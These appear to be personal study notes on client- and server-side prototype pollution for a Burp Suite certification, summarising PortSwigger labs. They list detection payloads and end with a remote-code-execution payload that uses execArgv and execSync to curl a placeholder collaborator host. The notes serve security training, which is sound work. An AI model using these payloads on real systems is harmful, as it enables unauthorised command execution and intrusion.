# Prototype Pollution

## Client-side

### Detecting:
- Portswigger heavily suggests the use of DOM invader
- [How to find sources](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#detecting-sources-for-prototype-pollution)
- [How to find gadgets](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#scanning-for-prototype-pollution-gadgets)

## Exploiting
- [Flawed sanitization](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/All%20Lab%20Solutions.md#lab-client-side-prototype-pollution-via-flawed-sanitization)
  - They only gave a manual solution
  - Used a file called `searchlogger.js`
  - Used a property in a property so that when deleted the outer property would remain.
- [Third party libraries](https://github.com/leggetth/Burp-Suite-Certified-Practitioner-Prep/blob/main/All%20Lab%20Solutions.md#lab-client-side-prototype-pollution-in-third-party-libraries)
  - Used DOM invader to find the hitCallback gadget.
  - Used XSS to exploit.

---

## Server-side

### Detecting:

- Three main methods:
  - Status code
    - Use an obscure status code like 517 or 555 etc.
    - Example:
      ```
      "__proto__": { "status":555 }
      "constructor": { "prototype": { "status":555 } }
      ```
  - JSON spaces
    - Spaces to change the appearance in the raw view in burp suite
    - Example:
      ```
      "__proto__": { "json spaces":10 }
      "constructor": { "prototype": { "json spaces":10 } }
      ```
  - Charset override
    - Use a different charset, if it works the characters will be translated to utf-8 in the response
    - So send something like the username in utf-7 and see if it is translated.
    - Example:
      ```
      +AGYAbwBv- --> "default" in utf-7
      "__proto__": { "content-type": "application/json; charset=utf-7" }
      "constructor": { "prototype": { "content-type": "application/json; charset=utf-7" } }
      ```
- There is a burp extension to scan for this.

## Exploiting:
- You can get remote code execution
  - [Portswigger](https://portswigger.net/web-security/prototype-pollution/server-side)
  - Payload: `"execArgv":[ "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" ]`

## Other important notes:
